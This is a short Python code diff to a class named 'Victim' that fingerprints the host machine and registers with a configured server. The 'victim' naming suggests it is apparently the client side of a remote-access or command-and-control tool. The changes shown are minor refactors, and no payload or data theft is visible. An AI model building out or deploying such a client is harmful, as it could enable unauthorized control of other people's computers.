@@ -22,9 +22,15 @@ class Victim:
         self.id = ut.get_id(Path("ole32.dll"))
         self.client_type = "victim"
         encoded_auth_token = ut.encode_token(auth_token)
-        self.default_header = {"Client-Id": self.id, "Client-Type": self.client_type, "Authorization": f"Basic {encoded_auth_token}"}
+        self.default_header = {
+            "Client-Id": self.id,
+            "Client-Type": self.client_type,
+            "Authorization": encoded_auth_token
+        }
 
     @staticmethod
+    # This code is borrowed with love
+    # from stackoverflow
     def get_processor_name():
         if platform.system() == "Windows":
             return platform.processor()
@@ -94,11 +100,11 @@ def initiate_victim(token: str, server_ip: str, server_port: int = 80):
 
 def main():
     config = get_config()
-    initiate_victim(config.token, config.ip, config.port)
+    try:
+        initiate_victim(config.token, config.ip, config.port)
+    except KeyboardInterrupt:
+        pass
 
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        pass
+    main()
